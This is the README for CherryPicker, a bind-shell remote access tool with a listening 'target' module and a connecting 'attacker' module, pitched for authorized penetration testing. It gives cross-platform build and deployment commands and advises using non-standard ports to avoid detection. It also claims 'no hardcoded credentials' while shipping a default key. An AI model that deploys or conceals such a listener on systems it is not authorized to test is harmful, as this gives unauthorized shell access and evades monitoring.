# CherryPicker

Authenticated bind shell for authorized penetration testing. Deploy a listener on target systems, then connect remotely to establish interactive shell access.

## ⚠️ Legal Disclaimer

This tool is designed **exclusively for authorized penetration testing** and security research. Unauthorized use of this tool against systems you don't own or have explicit permission to test is **illegal** and punishable by law.

**Only use this tool:**
- On systems you own
- During authorized penetration tests with written permission
- In controlled lab environments

## What It Does

CherryPicker is a two-part remote access tool consisting of:

1. **Target Module** - Deployed on authorized target systems, listens on a TCP port
2. **Attacker Module** - Run from your attack machine, connects to target and provides shell access

Communication is protected by challenge-response authentication using a shared secret key.

## How It Works

```
1. Deploy target module on authorized system → Listens on port
2. Run attacker module from your machine → Connects to target
3. Authentication handshake → SHA256 challenge-response
4. Interactive shell spawned → Full command execution
```

## Quick Start

### 1. Build Both Modules

```bash
# Build target module (to deploy on target)
cd target
go build -o cherrypicker-target

# Build attacker module (for your machine)
cd ../attacker
go build -o cherrypicker-attacker
```

**Cross-compile for different platforms:**
```bash
# Linux target
cd target && GOOS=linux GOARCH=amd64 go build -o cherrypicker-target-linux

# Windows target
cd target && GOOS=windows GOARCH=amd64 go build -o cherrypicker-target.exe

# macOS target (M1/M2)
cd target && GOOS=darwin GOARCH=arm64 go build -o cherrypicker-target-mac
```

### 2. Deploy Target Module

Copy `cherrypicker-target` to your authorized target system and run:

```bash
# Default: listens on port 9999 with default key
./cherrypicker-target

# Custom port and authentication key
./cherrypicker-target -port 8888 -key "YourSecretKey123"
```

The target will listen on all interfaces (0.0.0.0) waiting for connections.

### 3. Connect from Attacker

From your attack machine:

```bash
# Connect (both target and port are required)
./cherrypicker-attacker -target 192.168.1.50 -port 9999

# With custom authentication key (must match target)
./cherrypicker-attacker -target 192.168.1.50 -port 8888 -key "YourSecretKey123"

# With connection timeout
./cherrypicker-attacker -target 192.168.1.50 -port 9999 -timeout 30
```

If authentication succeeds, you'll get an interactive shell on the target.

## Command-Line Options

### Target Module
| Flag | Default | Description |
|------|---------|-------------|
| `-port` | 9999 | Port to listen on |
| `-key` | `CHERRY_PICKER_2025` | Authentication key |

### Attacker Module
| Flag | Default | Required | Description |
|------|---------|----------|-------------|
| `-target` | - | ✅ | Target IP address |
| `-port` | - | ✅ | Target port number |
| `-key` | `CHERRY_PICKER_2025` | ❌ | Authentication key (must match target) |
| `-timeout` | 10 | ❌ | Connection timeout in seconds |

## Architecture

```
┌─────────────────┐                    ┌──────────────────┐
│  Attacker       │                    │  Target          │
│  (Your Machine) │                    │  (Remote System) │
│                 │                    │                  │
│  ./attacker     │───── Connect ─────→│  :9999           │
│  -target IP     │                    │  (listening)     │
│  -port 9999     │                    │                  │
│                 │←──── Challenge ────│  Random nonce    │
│                 │                    │                  │
│  SHA256(nonce+  │───── Response ────→│  Verify hash     │
│         key)    │                    │                  │
│                 │                    │                  │
│                 │←──── AUTH_OK ──────│  Spawn shell     │
│                 │                    │                  │
│  Interactive    │←──── Shell I/O ────│  /bin/sh or      │
│  Shell          │                    │  cmd.exe         │
└─────────────────┘                    └──────────────────┘
```

## Authentication

Uses **SHA256 challenge-response** to prevent unauthorized access:

1. Target generates random challenge (16 bytes hex)
2. Attacker receives challenge
3. Attacker computes: `SHA256(challenge + shared_key)`
4. Attacker sends response hash
5. Target verifies hash matches expected value
6. If valid → shell spawned, If invalid → connection closed

**Both sides must use the exact same authentication key.**

## Features

- ✅ Challenge-response authentication (SHA256)
- ✅ Cross-platform (Linux, macOS, Windows)
- ✅ Automatic shell detection per OS
- ✅ IPv6 support
- ✅ Configurable ports and keys
- ✅ Connection timeouts
- ✅ System information banner
- ✅ No hardcoded credentials

## Security Considerations

⚠️ **Critical: Change the default authentication key before deployment!**

- Use strong, random keys (minimum 20 characters recommended)
- Keys are case-sensitive
- Target listens on all interfaces (0.0.0.0) - consider firewall rules
- Use non-standard ports to avoid detection
- Monitor connection attempts
- No encryption on shell traffic - use over trusted networks only
- Consider SSH tunneling for additional security

## Example Usage Scenarios

**Basic deployment:**
```bash
# On target (192.168.1.50)
./cherrypicker-target

# On attacker
./cherrypicker-attacker -target 192.168.1.50 -port 9999
```

**Secure deployment with custom key:**
```bash
# On target
./cherrypicker-target -port 31337 -key "Xk9m#pL2$vN8@qR5"

# On attacker
./cherrypicker-attacker -target 192.168.1.50 -port 31337 -key "Xk9m#pL2$vN8@qR5"
```

**IPv6 support:**
```bash
./cherrypicker-attacker -target 2001:db8::1 -port 9999
./cherrypicker-attacker -target fe80::1 -port 9999
```

## Troubleshooting

**"Connection refused"**
- Verify target module is running
- Check firewall rules on target
- Confirm IP address and port are correct

**"Authentication failed"**
- Ensure both sides use identical `-key` values
- Keys are case-sensitive
- No extra spaces in key strings

**"Connection timeout"**
- Target may be unreachable
- Increase `-timeout` value
- Test basic connectivity with `ping` or `telnet`

**"Port already in use"**
- Another service is using the port
- Choose a different port number
- Check with: `netstat -tulpn | grep <port>` (Linux)

## Building from Source

```bash
# Clone repository
git clone https://github.com/azizhayat37/cherrypicker.git
cd cherrypicker

# Initialize Go module (if needed)
go mod init cherrypicker
go mod tidy

# Build both modules
cd target && go build -o cherrypicker-target
cd ../attacker && go build -o cherrypicker-attacker
```

## Project Structure

```
cherrypicker/
├── target/
│   └── main.go          # Target listener module
├── attacker/
│   └── main.go          # Attacker client module
├── README.md            # This file
├── USAGE.md            # Detailed usage guide
└── LICENSE
```

## License

For authorized penetration testing use only. See LICENSE file.
